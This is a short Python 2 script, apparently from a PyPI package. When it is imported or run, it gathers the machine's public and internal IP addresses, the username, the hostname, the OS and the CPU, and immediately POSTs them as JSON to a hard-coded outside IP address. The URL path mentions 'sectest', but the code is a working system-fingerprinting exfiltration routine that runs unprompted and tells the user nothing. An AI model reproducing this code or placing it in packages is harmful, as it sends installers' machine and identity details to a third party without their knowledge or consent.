import platform
import socket
import os
import pwd
import json
import urllib2
import requests


try:
    ip = requests.get('https://checkip.amazonaws.com').text.strip()
except:
    ip = 'get error'


def get_username():
    try:
        username = pwd.getpwuid(os.getuid())[0]
    except:
        username = 'get error'

    return username


def get_inner_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(('8.8.8.8', 80))
        _ip = s.getsockname()[0]
    finally:
        s.close()

    return _ip


msg = {
    "IP": ip,
    "Inner_IP": get_inner_ip(),
    'User': get_username(),
    "OS": platform.platform(),
    'OS-Version': platform.version(),
    'OS-type': platform.system(),
    'Machine': platform.machine(),
    'Hostname': platform.node(),
    'CPU': platform.processor(),
    'Other': platform.uname()
 }


def post_inform():
    method = "POST"
    handler = urllib2.HTTPHandler()
    opener = urllib2.build_opener(handler)
    data = json.dumps(msg)
    request = urllib2.Request('http://81.70.89.72/sectest/package/pypi/upload', data=data)
    request.add_header("Content-Type",'application/json')
    request.get_method = lambda: method
    try:
        connection = opener.open(request)
    except urllib2.HTTPError,e:
        print(e)


post_inform()